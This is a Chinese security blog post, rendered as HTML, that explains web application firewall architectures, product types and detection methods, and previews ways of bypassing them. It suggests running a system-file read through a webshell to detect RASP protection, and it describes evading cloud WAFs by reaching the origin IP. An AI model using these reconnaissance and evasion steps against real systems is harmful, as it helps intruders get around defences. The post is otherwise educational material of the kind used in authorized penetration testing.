@@ -1,0 +1,2577 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WAF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WAF绕过思路分享，让每个白帽子都能过得起WAF">
+<meta name="keywords" content="WAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF普及篇">
+<meta property="og:url" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/index.html">
+<meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="WAF绕过思路分享，让每个白帽子都能过得起WAF">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223200707.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223239401.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/透明连接.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/反向代理.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223617569.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223623393.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223704638.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200117165807392.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200117170913367.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905224019792.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200117171730131.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200806231113308.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905224609621.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905224516336.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200506213900756.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/15196361788182.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/15196361991311.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/15196361998652.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/15196361999516.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905112523356.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20191211174253019.png">
+<meta property="og:updated_time" content="2020-09-05T15:01:29.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WAF普及篇">
+<meta name="twitter:description" content="WAF绕过思路分享，让每个白帽子都能过得起WAF">
+<meta name="twitter:image" content="https://jeremyekek.github.io/2020/05/20/WAF普及篇/image-20200905223200707.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":20,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jeremyekek.github.io/2020/05/20/WAF普及篇/">
+
+
+
+
+
+  <title>WAF普及篇 | EkEk的个人博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">EkEk的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2020/05/20/WAF普及篇/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="EkEk">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="EkEk的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WAF普及篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-05T23:01:29+08:00">
+                2020-09-05
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防对抗/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防对抗</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/05/20/WAF普及篇/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/05/20/WAF普及篇/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  WAF绕过思路分享，让每个白帽子都能过得起WAF
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-WAF概念"><a href="#0x00-WAF概念" class="headerlink" title="0x00 WAF概念"></a>0x00 WAF概念</h1><blockquote>
+<p>问：为什么要讲WAF概念？</p>
+<p>答：知己知彼，方能百战不殆。</p>
+<p>​        授人以鱼，不如授人以渔。</p>
+</blockquote>
+<p><strong>Web应用程序防火墙（WAF）的主要作用是过滤，监控和阻止各类进出Web应用程序的HTTP流量。</strong>是集 Web 防护、网页保护、负载均衡、应用交付于一体的 Web 整体安全防护设备，<strong>和防火墙的区别是它工作在应用层</strong>，主要对 Web 请求进行防护，有效阻止各类针对 Web 应用和 API 的攻击。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905223200707.png" alt="image-20200905223200707"></p>
+<p><strong>防御功能：</strong>如 SQL 注入、XML 注入、跨站脚本 (XSS)、自动化攻击(机器人程序)、应用层拒绝服务 (DoS) 、安全配置错误、WEB防火墙、<strong>服务器虚拟补丁</strong>等。</p>
+<p><strong>目前国内 WAF 产品技术能力：</strong>特征识别技术(语法语义分析)、机器学习、大数据分析、动态防御、RASP、威胁情报、容器技术和蜜罐技术等。</p>
+<h1 id="0x01-WAF架构"><a href="#0x01-WAF架构" class="headerlink" title="0x01 WAF架构"></a>0x01 WAF架构</h1><ul>
+<li><p>串联</p>
+</li>
+<li><p>旁路</p>
+</li>
+</ul>
+<h2 id="串联"><a href="#串联" class="headerlink" title="串联"></a>串联</h2><p><strong>串联WAF一般权重较高，对攻击的请求和会话有优先于业务的一票否决权，是最为常见的WAF架构方式。</strong></p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905223239401.png" alt="image-20200905223239401"></p>
+<p>不过串联接入业务意味着WAF系统会捆绑、分担业务指标，在日益追求高响应的复杂链路中强行增加了一个单点故障隐患，那考核运维健壮性的指标(可用性、响应耗时和故障率等)将是悬置WAF头顶的达摩克利斯之剑。</p>
+<p><strong>串联WAF根据产品形态又有多种变形，常见的区分方式看设备部署位置：</strong></p>
+<p>传统的硬件盒子设备一般放置在网关入口后，业务中间件之前，串联部署方式有透明模式、反向代理模式等。</p>
+<p>其前置于中间件，意味着WAF需预留很大一部分性能来处理HTTP拆解和封装的工作，尤其是当下HTTPS已成为普遍场景，设备处理性能急剧下降，使得此类架构的成本投入极大。</p>
+<p><strong>1. 透明连接模式：</strong></p>
+<blockquote>
+<p>最常见的部署模式</p>
+</blockquote>
+<p><img src="/2020/05/20/WAF普及篇/透明连接.png" alt="透明连接"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p>不需要改变用户网络结构，对于用户而言是透明的</p>
+</li>
+<li><p>故障恢复快</p>
+</li>
+</ul>
+<p><strong>2. 反向代理模式：</strong></p>
+<blockquote>
+<p>适应环境部署</p>
+</blockquote>
+<p><img src="/2020/05/20/WAF普及篇/反向代理.png" alt="反向代理"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p>可旁路部署，对于用户网络不透明</p>
+</li>
+<li><p>故障恢复时间慢</p>
+</li>
+</ul>
+<p><strong>3. 主备模式</strong></p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905223617569.png" alt="image-20200905223617569"></p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905223623393.png" alt="image-20200905223623393"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li>解决一定情况下WAF的单点故障问题</li>
+</ul>
+<p><strong>4. 集群模式</strong></p>
+<blockquote>
+<p>大势所趋</p>
+</blockquote>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905223704638.png" alt="image-20200905223704638"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li>高性能、更多新功能。</li>
+</ul>
+<p><strong>5. CNAME架构：</strong></p>
+<p>当下云厂商最常用修改域名CNAME做多维安全防护的架构同硬件类部署方式在应用场景视角是一致的，不过云厂商的设备和网络资源丰富，人才资源配备到位，又有大厂品牌背书，只要有足够的用户均摊成本，这种架构算在成本、效率、安全不可能三角中属协调最优的解决方案。</p>
+<p>但在部署之后，很有可能因配置不当等问题被绕过CDN解析，流量直接到达源站，从而被绕过安全防护。</p>
+<p>最常见的产品就是云WAF，政府和企业应用广泛。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200117165807392.png" alt="image-20200117165807392"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p>较低成本、更高效率、更安全。</p>
+</li>
+<li><p>但在部署之后，很可能因配置不当等问题被绕过CDN解析，流量直接到达源站，从而被绕过安全防护。</p>
+</li>
+</ul>
+<p><strong>6. 嵌入式部署：</strong></p>
+<p>还有另一类串联的部署方式，即WAF设备位置后移，嵌套到中间件上，这样WAF的损耗将分摊到业务机器，这样的捆绑意味着一荣俱荣，一损皆损，又因位置后移到了业务侧，策略下发和管理都极其复杂，且中间件种类繁多，规模一大，这种架构堪称灾难。</p>
+<p>因为WEB服务器是WAF所保护的对象。部署时当然要使WAF尽量靠近WEB服务器。但是这样对业务侵入性更强。（但还不是最强）</p>
+<p>比如安全狗、云锁等产品，适合小规模站点。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200117170913367.png" alt="image-20200117170913367"></p>
+<p>特点：</p>
+<ul>
+<li><p>分摊业务机器性能。</p>
+</li>
+<li><p>无视HTTP请求包前后解析不一致的问题。</p>
+</li>
+</ul>
+<p><strong>7. 嵌入式集群部署：</strong></p>
+<p>比如长亭雷池、腾讯门神等产品。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905224019792.png" alt="image-20200905224019792"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p>解决性能问题。</p>
+</li>
+<li><p>无视HTTP请求包前后解析不一致的问题。</p>
+</li>
+</ul>
+<p><strong>8. OpenResty部署：</strong></p>
+<p>而随着业务架构的逐渐优化，一般的互联网业务架构会前置越来越轻的转发层，将WAF嵌到转发层，或在转发层通过openresty等方式将请求过一遍旁挂的WAF集群，这属对业务链路侵入最轻的一种方式，很多互联网公司自建的WAF采用该架构。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200117171730131.png" alt="image-20200117171730131"></p>
+<h2 id="旁路"><a href="#旁路" class="headerlink" title="旁路"></a>旁路</h2><p><strong>旁路WAF可以理解为一套离线分析系统，在各类配置和参数设置上很难同业务机器同步，这导致两者之间的耦合缺漏会更大</strong>，旁路部署的后置阻断措施也极具多样性：IP维度(OSI 4层封禁、7层封禁)，Session维度(业务路由基于登陆的cookies等)。</p>
+<p>适合于刚开始部署WAF时，用于收集和了解服务器被访问和被攻击的信息，为后续在线部署提供优化配置参考。这种部署工作模式，对原有网络不会有任何影响。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200806231113308.png" alt="image-20200806231113308"></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li>一般只会进行告警而不阻断。</li>
+</ul>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905224609621.png" alt="image-20200905224609621"></p>
+<p>旁挂WAF一般不在会话链路以内，这意味着针对命令执行、Getshell类的一条语句拿权限的攻击束手无策，满足业务性能，牺牲了较多的安全指标，做出这种妥协，一方面是业务/运维强势，可用性是相关部门较重的KPI指标，另一方面可能是WAF系统开发和运营人力资源紧张，旁路离线分析提供了一定的缓和空间。</p>
+<h2 id="灵活组合"><a href="#灵活组合" class="headerlink" title="灵活组合"></a>灵活组合</h2><p>WAF产品架构多样，除了串联和旁路外，基于业务特性还有各种各样的组合方式。</p>
+<p>比如基于业务架构单一的特点(系统、语言、中间件、数据库版本等相关信息全局一致)，只需要关注固定版本的系统/应用漏洞情报，便可采用平日旁挂，漏洞爆发打开串联开关，漏洞批量修复后恢复旁挂的方式，在安全、效率、成本的博弈中发挥一点能动性。</p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905224516336.png" alt="image-20200905224516336"></p>
+<p>特点：</p>
+<ul>
+<li>灵活</li>
+</ul>
+<h1 id="0x02-WAF类型"><a href="#0x02-WAF类型" class="headerlink" title="0x02 WAF类型"></a>0x02 WAF类型</h1><h2 id="产品形态划分"><a href="#产品形态划分" class="headerlink" title="产品形态划分"></a>产品形态划分</h2><ul>
+<li>硬WAF</li>
+<li>软WAF</li>
+<li>云WAF</li>
+<li>代码WAF</li>
+<li>RASP</li>
+</ul>
+<h3 id="1-硬件WAF"><a href="#1-硬件WAF" class="headerlink" title="1. 硬件WAF"></a>1. 硬件WAF</h3><p>使用专门的硬件设备，可以理解为流量代理，一般部署方式都需要流量经过它，针对数据包进行拆包-&gt;清洗-&gt;规则命中-&gt;放行/丢弃。</p>
+<p><strong>适用客户：</strong></p>
+<p>对于安全需求较高的网站，如政府、金融、运营商多采购易用、稳定、高吞吐量的硬件 WAF 产品。</p>
+<p><strong>常见产品：</strong>各厂商铁盒子WAF（深信服、天融信、启明星辰、安恒、绿盟等）</p>
+<p><strong>部署方式：</strong>硬件 Web 防火墙为旁路式和串联式部署在 Web 服务器前</p>
+<h3 id="2-软件WAF"><a href="#2-软件WAF" class="headerlink" title="2. 软件WAF"></a>2. 软件WAF</h3><p>实时监听端口（服务）</p>
+<p>在主机上预先安装了这种防护软件，和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。</p>
+<p><strong>适用客户：</strong></p>
+<p>软件 WAF 需要单台服务器部署，占用内存过多，并可能存在影响正常业务和被绕过的风险，适合中小型网站。</p>
+<p><strong>常见产品：</strong>云锁，安全狗、D盾、护卫神、ModSecurity、ngx-lua-waf等。</p>
+<p><strong>部署方式：</strong>软件 WAF 为代理和嵌入式</p>
+<h3 id="3-云WAF"><a href="#3-云WAF" class="headerlink" title="3. 云WAF"></a>3. 云WAF</h3><p>通常是CDN包含的WAF，专门的流量传到检测节点中做检测</p>
+<p>云 WAF 服务采用多租户模式、以云为中心，只需通过移交域名解析权就可实现安全防护，大大减轻了用户的运维成本。</p>
+<p><strong>适用客户：</strong></p>
+<p>国内云 WAF 用户更偏向于互联网行业。对于一些数据保密级别较高的政企，数据上云是否存在数据泄漏风险，也是客户考虑的因素。</p>
+<p><strong>常见产品：</strong>阿里云，腾讯云，创宇盾，京东云，百度云、CloudFlare、Imperva、安全宝等</p>
+<p><strong>部署方式：</strong>过移交域名解析权来实现安全防护</p>
+<h3 id="4-代码WAF"><a href="#4-代码WAF" class="headerlink" title="4. 代码WAF"></a>4. 代码WAF</h3><p>使用脚本语言实现的过滤器模式</p>
+<p>这种机制本质上属于应用程序安全架构的范畴，它是遵循安全编码最佳实践的产物。</p>
+<h3 id="5-RASP"><a href="#5-RASP" class="headerlink" title="5. RASP"></a>5. RASP</h3><blockquote>
+<p>Gartner 在2014年应⽤安全报告⾥将其列为应⽤安全领域的关键趋势。</p>
+</blockquote>
+<p>RASP 全称 Runtime application self-protection(运⾏时应⽤⾃我保护)，即将防护引擎嵌入到应用内部，不再依赖外部防护设备。</p>
+<p><strong>防护原理：</strong></p>
+<p>其本质上是从编程语言层面挂钩关键函数，深度监控应用执行流。在数据库、网络、文件系统等多个层面，对应用进行全面的监控和防护。</p>
+<p><strong>常见产品：</strong>OPENRASP(百度开源)、灵蜥、安数云、宝塔、云锁等。</p>
+<p><strong>部署方式：</strong>通过不同语言定制开发</p>
+<p><strong>Java实现方式</strong></p>
+<p>通过Java Agent方式实现</p>
+<p><strong>判断方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:xxx.jar=mode=test Test -jar agent-1.0-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
+<p>启动命令行可以通过Webshell执行命令查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure>
+<p>还可以寻找是否存在RASP相关日志文件，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rasp/logs/rasp/rasp.log</span><br></pre></td></tr></table></figure>
+<p>也可能会添加响应头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Protected-By: 「rasp」</span><br></pre></td></tr></table></figure>
+<p><strong>PHP实现方式</strong></p>
+<p>通过开发第三方PHP扩展库实现</p>
+<p><strong>判断方法</strong></p>
+<ul>
+<li><p>phpinfo()页面查找rasp相关模块</p>
+</li>
+<li><p>或者模块路径中查找文件</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib64/php/modules/「rasp」.so</span><br></pre></td></tr></table></figure>
+<p><strong>RASP vs 传统WAF</strong></p>
+<p>类似于保镖和保安的区别。</p>
+<p>优点：</p>
+<table>
+<thead>
+<tr>
+<th><strong>RASP</strong></th>
+<th>WAF</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>几乎0误报，让告警更加有意义</td>
+<td>触发规则即告警</td>
+</tr>
+<tr>
+<td>针对编程语言深度定制</td>
+<td>一套规则吃所有</td>
+</tr>
+<tr>
+<td>更接近应用层</td>
+<td>大部分隔着网络层，带来更多绕过可能</td>
+</tr>
+</tbody>
+</table>
+<p>缺点：</p>
+<blockquote>
+<p>优缺点比较鲜明的产品</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>RASP</strong></th>
+<th>WAF</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>不同环境/产品性能消耗不一</td>
+<td>流量/规则影响性能</td>
+</tr>
+<tr>
+<td>业务侵入性更高</td>
+<td>不影响业务系统运行</td>
+</tr>
+<tr>
+<td>还不够成熟</td>
+<td>市场占有率依旧高</td>
+</tr>
+</tbody>
+</table>
+<h2 id="部署位置划分"><a href="#部署位置划分" class="headerlink" title="部署位置划分"></a>部署位置划分</h2><ul>
+<li>嵌入式</li>
+<li>非嵌入式</li>
+</ul>
+<h3 id="1-嵌入式"><a href="#1-嵌入式" class="headerlink" title="1. 嵌入式"></a>1. 嵌入式</h3><blockquote>
+<p>先中间件解析后，再经过WAF处理</p>
+</blockquote>
+<p>特点：嵌入式无需考虑解析问题，但比较消耗业务系统资源。</p>
+<p>常见产品：软件WAF、RASP WAF等。</p>
+<h3 id="2-非嵌入式"><a href="#2-非嵌入式" class="headerlink" title="2. 非嵌入式"></a>2. 非嵌入式</h3><blockquote>
+<p>与业务分离的WAF都属于非嵌入式</p>
+</blockquote>
+<p>特点：部署灵活，但因为需要自身进行解析，可能会存在与后端服务器解析不一致导致绕过。</p>
+<p>常见产品：硬WAF、云WAF等。</p>
+<h2 id="绕过风险"><a href="#绕过风险" class="headerlink" title="绕过风险"></a>绕过风险</h2><p><strong>1. 云WAF</strong></p>
+<blockquote>
+<p>如果配置不当，且获取了真实IP地址，通过强制解析域名，就可以轻松绕过。</p>
+</blockquote>
+<p>云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</p>
+<p><strong>2. 硬WAF</strong></p>
+<p>硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</p>
+<p><strong>3. 软件WAF</strong></p>
+<p>国内的很多中小企业或者个人站长喜欢部署一些软件WAF来节约成本，软件WAF也属于嵌入式的WAF，协议层面的绕过方法是无效的，主流方式是使用规则绕过，也可能限于成本或者某些原因，规则很容易被绕过。</p>
+<p><strong>4. 代码WAF</strong></p>
+<ul>
+<li><p>规则不严谨，比如：</p>
+<ul>
+<li>未考虑大小写、编码等</li>
+<li>字符串替换为空，但未多次匹配</li>
+</ul>
+</li>
+<li><p>代码逻辑问题</p>
+</li>
+</ul>
+<p><strong>5. RASP</strong></p>
+<ul>
+<li><p>hook点</p>
+</li>
+<li><p>本身的安全性（等同于业务系统权限）</p>
+</li>
+</ul>
+<p><strong>6. 嵌入式WAF</strong></p>
+<ul>
+<li>规则</li>
+<li>性能</li>
+</ul>
+<p><strong>7. 非嵌入式WAF</strong></p>
+<ul>
+<li><strong>协议解析</strong></li>
+<li>规则</li>
+<li>性能</li>
+</ul>
+<h1 id="0x03-拦截原理"><a href="#0x03-拦截原理" class="headerlink" title="0x03 拦截原理"></a>0x03 拦截原理</h1><ul>
+<li>正则匹配</li>
+<li>语义分析</li>
+<li>机器学习</li>
+<li><strong>组合使用</strong></li>
+</ul>
+<h2 id="基于正则匹配"><a href="#基于正则匹配" class="headerlink" title="基于正则匹配"></a>基于正则匹配</h2><p>在Web攻击检测发展中，大部分还是传统的基于正则的检测方式，一般是从所有攻击特征提炼出匹配正则，用正则引擎去检测提交的请求是否是可以命中，命中即判为恶意。这种依赖于正则匹配的检测，在面对变化多样的攻击payload就需要不断的补齐规则，规则维护麻烦且易出错，规则越多检测速度越慢影响性能，且基于正则的匹配理论上证明无法完全避免漏报和误报，面对场景多样的Web请求场景，规则策略人员都是在误报和漏报中寻找一个平衡。</p>
+<p>缺点：</p>
+<ul>
+<li>需要不断的更新规则，维护麻烦且易出错。</li>
+<li>规则越多检测速度越慢影响性能。（集群解决）</li>
+<li>基于正则的匹配理论上无法完全避免漏报和误报。</li>
+</ul>
+<h2 id="基于语义分析"><a href="#基于语义分析" class="headerlink" title="基于语义分析"></a>基于语义分析</h2><p>基于语义分析的检测前提是检测类型本身具备规则定义的语义规范，如运用SQL数据库语言的SQL注入攻击，运用JavaScript的XSS攻击。本质是检测当前输入的检测内容是否是符合对应的语法规范，从语义上去理解当前payload是否是攻击。</p>
+<p>开源产品：libinjection</p>
+<p>一些参考：</p>
+<p><a href="https://www.anquanke.com/post/id/86097" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86097</a></p>
+<p><a href="https://gist.github.com/migolovanov/432fe28c8c7e9fa675ab3903c5eda77f" target="_blank" rel="noopener">https://gist.github.com/migolovanov/432fe28c8c7e9fa675ab3903c5eda77f</a></p>
+<p><a href="https://mp.weixin.qq.com/s/w5TwFl4Ac1jCTX0A1H_VbQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/w5TwFl4Ac1jCTX0A1H_VbQ</a></p>
+<h2 id="基于机器学习"><a href="#基于机器学习" class="headerlink" title="基于机器学习"></a>基于机器学习</h2><p>基于机器学习分为监督学习和无监督学习，监督学习是根据收集标记的黑白样本，训练出一个检测模型来做预测，无监督学习采用建立正常流量模型，不符合模型的流量识别为恶意，两种方式可能由于样本的不足或特征选取问题，导致漏判或误判，加上不同的算法选择可能会带来更长的延迟，有的可能只在旁路离线跑做为离线数据分析用，还不适合线上实时拦截运行。</p>
+<p>大多数使用无监督学习的方法，针对大量正常日志建立模型，与正常流量不符的则被识别为异常。这个思路与拦截规则的构造恰恰相反。<strong>拦截规则意在识别入侵行为</strong>，因而需要在对抗中“随机应变”；而<strong>基于模型的方法旨在建模正常流量</strong>，在对抗中“以不变应万变”。</p>
+<ul>
+<li>一般作为辅助手段，结合其他方式一同使用。</li>
+</ul>
+<h2 id="语义-机器学习"><a href="#语义-机器学习" class="headerlink" title="语义+机器学习"></a>语义+机器学习</h2><p>目前比较新颖且主流的WAF采用基于<strong>语义分析</strong>结合<strong>机器学习</strong>打分评判，比如长亭雷池、腾讯门神等。</p>
+<p>相对于传统正则引擎，这种方式也多了一些比较另类的绕过可能，总结这些绕过其核心的思路有以下两点：</p>
+<ol>
+<li><p>利用解析器和后端处理逻辑的不一致，构造实际可以执行的payload ，但是语法分析会出现语法错误或者打分认为是无害的，骗过引擎。</p>
+</li>
+<li><p>为了后续能够处理 WAF 中的特殊场景（比如闭合，要同时适配多种后端），WAF 语义分析的解析引擎一般会自行进行实现，一旦出现实现者没有考虑到的点，或者有一些后端的特性没有覆盖到，就可能引发绕过。</p>
+</li>
+</ol>
+<p>具体一些绕过案例可以参考这篇文章：<a href="https://security.tencent.com/index.php/blog/msg/151" target="_blank" rel="noopener">门神WAF众测总结</a></p>
+<h1 id="0x04-绕过维度"><a href="#0x04-绕过维度" class="headerlink" title="0x04 绕过维度"></a>0x04 绕过维度</h1><ul>
+<li>架构层面</li>
+<li>协议/中间件层面</li>
+<li>资源限制</li>
+<li>编码层面</li>
+<li>白名单策略</li>
+<li>输出层面</li>
+<li>应用(编程语言/数据库)/系统</li>
+<li>搜索引擎层面</li>
+</ul>
